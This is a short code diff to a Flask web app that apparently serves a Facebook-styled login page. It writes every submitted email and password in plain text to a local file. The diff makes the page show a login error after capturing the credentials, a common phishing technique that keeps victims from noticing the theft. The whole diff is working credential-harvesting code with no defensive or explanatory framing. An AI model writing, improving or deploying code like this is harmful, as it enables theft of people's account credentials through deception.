@@ -4,17 +4,19 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template("siteFacebookPHoneDesigne.html")
-
+    error = False
+    return render_template("siteFacebookPHoneDesigne.html",error = error)
+    
 @app.route('/',  methods=['POST'])
 def login():
+    error = True
     email = request.form.get('email')
     password = request.form.get('password')
     with open("./login_data.txt", "a") as f:
         f.write("email: " + email + "\n")
         f.write("password: " + password + "\n")
         f.write("========================"+"\n")
-    return render_template("Welcome.html" ,email_t=email ,password_t=password)
+    return render_template("siteFacebookPHoneDesigne.html" , error = error)
 
 # @app.route('/',methods=['GET'])
 # def index():
